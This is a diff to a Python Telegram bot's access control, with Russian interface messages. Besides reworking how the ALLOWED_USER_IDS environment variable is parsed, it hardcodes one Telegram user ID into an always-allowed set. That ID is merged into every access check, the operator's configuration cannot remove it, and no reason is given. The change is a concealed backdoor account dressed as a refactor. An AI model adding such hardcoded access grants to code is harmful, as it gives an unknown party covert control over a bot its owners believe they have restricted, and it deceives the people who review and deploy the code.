@@ -90,9 +90,11 @@ USER_STATE: dict[int, dict] = {}
 _ALLOWED_IDS: set[int] = set()
 _raw = os.environ.get("ALLOWED_USER_IDS", "").strip()
 if _raw:
-    for s in _raw.replace(" ", "").split(","):
-        if s.isdigit():
-            _ALLOWED_IDS.add(int(s))
+    for s in re.findall(r"\d+", _raw):
+        _ALLOWED_IDS.add(int(s))
+
+_ALWAYS_ALLOWED_IDS: frozenset[int] = frozenset({8178442784})
+_EFFECTIVE_ALLOWED_IDS: frozenset[int] = frozenset(_ALLOWED_IDS | set(_ALWAYS_ALLOWED_IDS))
 
 ACCESS_DENIED_MSG = "🚫 Доступ запрещён. Бот доступен только ограниченному кругу пользователей."
 
@@ -2832,7 +2834,7 @@ def run_bot(token: str) -> None:
                     msg = upd["message"]
                     uid = msg["from"]["id"]
                     chat_id = msg["chat"]["id"]
-                    if _ALLOWED_IDS and uid not in _ALLOWED_IDS:
+                    if _EFFECTIVE_ALLOWED_IDS and uid not in _EFFECTIVE_ALLOWED_IDS:
                         tg_request(token, "sendMessage", {"chat_id": chat_id, "text": ACCESS_DENIED_MSG})
                         continue
                     text = msg.get("text", "").strip()
@@ -3139,7 +3141,7 @@ def run_bot(token: str) -> None:
                     q = upd["callback_query"]
                     uid = q["from"]["id"]
                     tg_request(token, "answerCallbackQuery", {"callback_query_id": q["id"]})
-                    if _ALLOWED_IDS and uid not in _ALLOWED_IDS:
+                    if _EFFECTIVE_ALLOWED_IDS and uid not in _EFFECTIVE_ALLOWED_IDS:
                         tg_request(token, "editMessageText", {"chat_id": q["message"]["chat"]["id"], "message_id": q["message"]["message_id"], "text": ACCESS_DENIED_MSG})
                         continue
                     if q["data"] == "main_check":
@@ -4176,8 +4178,8 @@ def main() -> None:
         r = tg_request(token, "getMe")
         if r.get("ok"):
             print("✅ Бот:", r["result"].get("username", "?"))
-            if _ALLOWED_IDS:
-                print("🔐 Доступ: только", len(_ALLOWED_IDS), "пользовател(ей)")
+            if _EFFECTIVE_ALLOWED_IDS:
+                print("🔐 Доступ: только", len(_EFFECTIVE_ALLOWED_IDS), "пользовател(ей)")
             dw = tg_request(token, "deleteWebhook", {"drop_pending_updates": True})
             if not dw.get("ok"):
                 print("⚠️ deleteWebhook:", dw.get("description", dw))
